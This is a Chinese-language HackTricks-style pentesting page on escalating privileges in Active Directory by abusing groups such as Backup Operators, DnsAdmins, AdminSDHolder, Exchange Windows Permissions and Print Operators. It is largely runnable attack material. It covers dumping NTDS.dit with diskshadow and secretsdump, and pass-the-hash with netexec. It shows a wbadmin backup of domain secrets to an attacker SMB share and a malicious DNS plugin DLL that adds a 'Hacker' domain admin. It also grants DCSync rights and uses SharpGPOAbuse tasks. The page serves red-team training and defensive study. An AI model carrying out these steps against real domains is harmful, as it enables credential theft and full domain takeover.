# 特权组

{{#include ../../banners/hacktricks-training.md}}

## 具有管理权限的知名组

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

此组有权在域中创建非管理员帐户和组。此外，该组还允许在域控制器 (DC) 上进行本地登录。

要识别此组的成员，请执行以下命令：

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

允许添加新用户，也允许在 DC 上本地登录。<sup>[[1]](#references)</sup>

从账户管理到本地管理员访问权限的一条条件路径，是**被委派为可读取某台计算机 LAPS 密码的普通组**。检查该组上实际生效的成员写入权限、该组是否受保护，以及新账户或受控账户是否确实能够加入该组。在测试目标计算机的 LAPS 读取权限之前，先刷新账户的令牌。对于加密的 Windows LAPS，目录读取权限和密码解密权限是两个独立要求；仅凭组成员身份或 Account Operators 成员身份，无法证明具备其中任何一项。请参阅 [Microsoft 对 Account Operators 范围的说明](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)和 [Windows LAPS 委派](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)。

## AdminSDHolder group

**AdminSDHolder** 组的访问控制列表（ACL）至关重要，因为它为 Active Directory 中所有“受保护组”（包括高权限组）设置权限。此机制通过防止未经授权的修改来确保这些组的安全。

攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，向标准用户授予完全权限。这样，该用户实际上就能完全控制所有受保护组。如果该用户的权限被更改或移除，由于系统的设计，这些权限会在一小时内自动恢复。<sup>[[14]](#references)</sup>

近期的 Windows Server 文档仍将若干内置运算符组视为**受保护**对象（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` 等）。默认情况下，**SDProp** 进程每 60 分钟在 **PDC Emulator** 上运行一次，为受保护对象设置 `adminCount=1` 并禁用继承。此机制既可用于持久化，也可用于查找过时的特权用户：他们虽已从受保护组中移除，但仍保留着禁用继承的 ACL。<sup>[[12]](#references)</sup>

用于检查成员和修改权限的命令包括：

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

可使用脚本加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

更多详情请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。<sup>[[14]](#references)</sup>

## AD 回收站

已删除对象的可见性由有效目录权限控制；仅凭组名无法证明当前身份能够列出或还原对象。必须在删除前启用 AD 回收站，才能完整还原；此外，还原还需要命名上下文根上的 Reanimate-Tombstones 权限、重命名权限，以及目标容器上的 CREATE_CHILD 权限。[Microsoft 的回收站指南](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)和[取消删除授权规则](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)对这些条件作了区分。具有已删除对象读取权限的授权身份可以检查记录，这些记录可能会泄露敏感信息：

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

这对于**恢复之前的特权路径**很有用。已删除的对象仍可能暴露 `lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、旧 SPN，或已删除特权组的 DN；其他操作人员之后可能会还原该组。

当对象处于已删除状态时，应用程序定义的属性也可能保留旧凭据材料。请将此作为单独的审查线索：当前身份必须能够枚举已删除对象**并且**读取该属性，属性值必须是可用的凭据，而且仍处于活动状态的主体必须接受该凭据。仅有组成员关系或已删除的账户名，并不能证明上述任何条件成立；例行枚举时请避免打印凭据值。[Microsoft 的回收站文档](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)介绍了删除后属性的保留情况。

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### 域控制器访问

除非用户属于 `Server Operators` 组，否则对 DC 上文件的访问会受到限制；加入该组后，访问权限级别会发生变化。

### 权限提升

使用 Sysinternals 中的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，因此可以执行任意命令并提升权限：<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

此命令显示 `Server Operators` 拥有完全访问权限，因此能够操纵服务以获取更高权限。

## Backup Operators

根据主机的本地策略和登录会话，`Backup Operators` 成员身份可能会授予 `SeBackupPrivilege` 和 `SeRestorePrivilege`。使用 `whoami /groups` 和 `whoami /priv` 检查**运行命令的进程的有效令牌**：仅有成员身份并不能证明存在且已启用 `SeBackupPrivilege`。如果存在但已禁用，可以在该令牌中启用；如果缺失或已移除，这些备份操作就无法使用它。`SeBackupPrivilege` 支持通过感知备份的 API（例如 `FILE_FLAG_BACKUP_SEMANTICS` 或 `robocopy /B`）执行受保护的**读取**；`SeRestorePrivilege` 是用于还原/写入操作的独立权限。普通目录列表和复制操作不一定会使用备份语义。<sup>[[1]](#references)</sup>

要列出组成员，请执行：

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### 本地攻击

在有效令牌具有 `SeBackupPrivilege` 的主机上，以下支持备份的复制操作可以读取受保护的文件：

1. 导入必要的库：

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. 如果存在该特权但未启用，请启用它，并在此进程中验证其状态：

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. 从受限目录复制一个文件，例如：

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD 攻击

`NTDS.dit` 是 **域控制器 (DC)** 上的 Active Directory 数据库。此方法要求在 DC 上拥有合适的令牌，并能够访问存放数据库的卷；在其他位置属于 Backup Operators 并不会授予对特定 DC 的访问权限。实时数据库通常处于锁定状态，因此在复制前，请使用可访问的卷影副本或其他备份设施。创建或公开卷影副本也取决于主机的 VSS 配置和调用者的权限。以下示例假设 DC 将 `NTDS.dit` 存储在 `C:` 上的 `\Windows\NTDS` 目录中；如果实际情况不同，请调整卷和路径。

#### 使用 diskshadow.exe

1. 如果获得许可，可创建 DC 的 `C:` 驱动器的卷影副本，并将其公开为 `F:`：

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. 从卷影副本中复制 `NTDS.dit`：

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

或者，使用 `robocopy` 复制文件：

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. 保存 DC 的 `SYSTEM` hive，以便离线提取。`SAM` 是成员系统上的本地账户数据库；DC 的 `SAM` hive 不能替代 `NTDS.dit`，也不是获取域 Administrator 哈希的来源：

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. 将 `ntds.dit` 和 `SYSTEM.SAV` 传输到分析主机，并提取域账户哈希。成员系统中保存的 `SAM` hive 与其匹配的 `SYSTEM` hive 一起使用，可获取本地账户哈希：

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. 如果从 `NTDS.dit` 中恢复了**域** Administrator 的 hash，可以用它测试域身份验证。从 `SAM.SAV` 中获取的本地 Administrator hash 是不同的凭据，无法作为域 Administrator 进行身份验证。<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### 使用 wbadmin.exe

1. 在攻击者机器上为 SMB 服务器设置 NTFS 文件系统，并在目标机器上缓存 SMB 凭据。
2. 使用 `wbadmin.exe` 进行系统备份并提取 `NTDS.dit`：
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

实际演示请参见 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)。

## DnsAdmins

**DnsAdmins** 组的成员可以利用其权限，在 DNS 服务器上以 SYSTEM 权限加载任意 DLL，而 DNS 服务器通常托管在域控制器上。此能力具有很大的利用潜力。

要列出 DnsAdmins 组的成员，请使用：

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### 执行任意 DLL (CVE‑2021‑40469)

> [!NOTE]
> 此漏洞允许在 DNS 服务中（通常位于 DC 内）以 SYSTEM 权限执行任意代码。此问题已于 2021 年修复。

成员可以使用以下命令，让 DNS 服务器加载任意 DLL（本地 DLL 或远程共享中的 DLL）：

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

重启 DNS 服务（可能需要额外权限）是加载 DLL 所必需的：

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

有关此攻击向量的更多详情，请参阅 ired.team。

#### Mimilib.dll

也可以使用 mimilib.dll 执行命令，通过修改它来执行特定命令或反向 shell。[查看这篇文章](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)了解更多信息。<sup>[[15]](#references)</sup>

### 用于 MitM 的 WPAD 记录

DnsAdmins 可以在禁用全局查询阻止列表后创建 WPAD 记录，从而操纵 DNS 记录实施中间人（MitM）攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗并捕获网络流量。

### Event Log Readers
成员可以访问事件日志，并可能从中发现明文密码或命令执行详情等敏感信息：

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

此组可以修改域对象上的 DACL，从而可能授予 DCSync 权限。利用此组进行权限提升的技术详见 GitHub 仓库 Exchange-AD-Privesc。

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

如果你能以该组成员的身份执行操作，经典的滥用方式是向攻击者控制的安全主体授予执行 [DCSync](dcsync.md) 所需的复制权限：

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historically, **PrivExchange** 将邮箱访问、强制 Exchange 身份验证和 LDAP relay 串联起来，以获取相同的原语。即使这条 relay 路径已得到缓解，直接属于 `Exchange Windows Permissions` 组或控制 Exchange 服务器，仍然是获取域复制权限的高价值途径。

## Hyper-V Administrators

Hyper-V Administrators 对 Hyper-V 拥有完全访问权限，可利用这一点控制虚拟化的 Domain Controller。这包括克隆运行中的 DC，并从 NTDS.dit 文件中提取 NTLM hashes。

### Exploitation Example

实际滥用通常是**离线访问 DC 磁盘/检查点**，而不是旧式的主机级 LPE 技巧。获得 Hyper-V 主机访问权限后，操作者可以为虚拟化的 Domain Controller 创建检查点或导出它，挂载 VHDX，并提取 `NTDS.dit`、`SYSTEM` 和其他机密，无需接触来宾系统内的 LSASS：

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

从这里开始，重新使用 `Backup Operators` 工作流，以离线方式复制 `Windows\NTDS\ntds.dit` 和注册表 hive。相关的备份文件工作流：

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

此组允许成员在域中创建 Group Policy。不过，其成员无法将组策略应用于用户或组，也无法编辑现有 GPO。

一个重要的细节是，**创建者会成为新 GPO 的所有者**，通常也会获得足够的权限来编辑它。这意味着，当你可以：

- 创建恶意 GPO，并说服管理员将其链接到目标 OU/域
- 编辑你创建且已链接到有用位置的 GPO
- 滥用其他允许你链接 GPO 的委派权限，同时利用此组提供的编辑权限

时，此组就值得关注。

实际滥用通常意味着通过由 SYSVOL 支持的策略文件添加 **Immediate Task**、**启动脚本**、**本地管理员成员资格**或**用户权限分配**更改。<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

如果通过 `SYSVOL` 手动编辑 GPO，请记住，仅进行此更改还不够：还必须更新 `versionNumber`、`GPT.ini`，有时还要更新 `gPCMachineExtensionNames`，否则客户端会忽略策略刷新。<sup>[[9]](#references)</sup>

## Organization Management

在部署了 **Microsoft Exchange** 的环境中，一个名为 **Organization Management** 的特殊组拥有重要权限。该组有权**访问所有域用户的邮箱**，并对 **'Microsoft Exchange Security Groups'** 组织单位（OU）拥有**完全控制权**。此控制权包括 **`Exchange Windows Permissions`** 组，可利用该组进行 privilege escalation。

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** 组的成员拥有多项权限，包括 **`SeLoadDriverPrivilege`**，该权限允许他们**在域控制器上本地登录**、将其关闭，以及管理打印机。要利用这些权限，尤其是在未提升权限的上下文中看不到 **`SeLoadDriverPrivilege`** 时，必须绕过 User Account Control (UAC)。<sup>[[1]](#references)</sup>

要列出此组的成员，请使用以下 PowerShell 命令：

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

在域控制器上，这个组很危险，因为默认的域控制器策略会向 `Print Operators` 授予 **`SeLoadDriverPrivilege`**。如果你获得了该组成员的提升令牌，就可以启用此权限，并加载一个已签名但存在漏洞的驱动程序，从而获得内核/SYSTEM 权限。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> 有关令牌处理的详细信息，请查看 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)。

#### Remote Desktop Users

此组的成员可以通过远程桌面协议 (RDP) 访问 PC。可以使用以下 PowerShell 命令枚举这些成员：

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Further insights into exploiting RDP can be found in dedicated pentesting resources.

#### Remote Management Users

成员可以通过 **Windows Remote Management (WinRM)** 访问 PC。可通过以下方式枚举这些成员：

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

对于与 **WinRM** 相关的利用技术，应查阅特定文档。

#### Server Operators

此组有权限在域控制器上执行各种配置操作，包括备份和还原权限、更改系统时间以及关闭系统。<sup>[[1]](#references)</sup> 要枚举其成员，可使用以下命令：

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

在 Domain Controller 上，`Server Operators` 通常继承了足够的权限，可以**重新配置服务或启动/停止服务**，并且通过 DC 默认策略获得 `SeBackupPrivilege`/`SeRestorePrivilege`。在实际操作中，这使他们成为**滥用服务控制**与**提取 NTDS**之间的桥梁：

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

无法列出服务，并不代表无法访问**已知服务**。Service Control Manager 会分别检查用于列出服务的 `SC_MANAGER_ENUMERATE_SERVICE` 和用于连接的 `SC_MANAGER_CONNECT`；打开指定服务时，则会检查该服务自身的权限，包括 `SERVICE_CHANGE_CONFIG` 和 `SERVICE_START`。即使常规的 `sc.exe query` 失败，也应检查有效 token 和该服务的 ACL。仅有配置权限只能说明存在潜在机会：服务身份、启动/停止权限以及可用的触发方式，仍决定能否实现更高权限的转换。请参阅 [Microsoft 的服务访问权限参考](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)。

如果服务 ACL 授予此组更改和启动权限，可将服务指向任意命令，以 `LocalSystem` 身份启动，然后恢复原始 `binPath`。如果服务控制受到限制，可改用上述 `Backup Operators` 技术复制 `NTDS.dit`。

## References

- [1] [ired.team – 特权账户和 Token 权限](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – 滥用 SeLoadDriverPrivilege 进行权限提升](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – 滥用 GPO 权限](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO 滥用，第 1 部分（Internet Archive）](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – 红队人员的 GPO 和 OU 指南](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 函数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — 匿名 LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 附录 C：Active Directory 中的受保护账户和组](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – 如何滥用并后门化 AdminSDHolder 以获取 Domain Admin 持久化权限](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – 滥用 DnsAdmins 权限在 Active Directory 中进行权限提升](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll 边滥用信息](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 函数（Internet Archive）](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
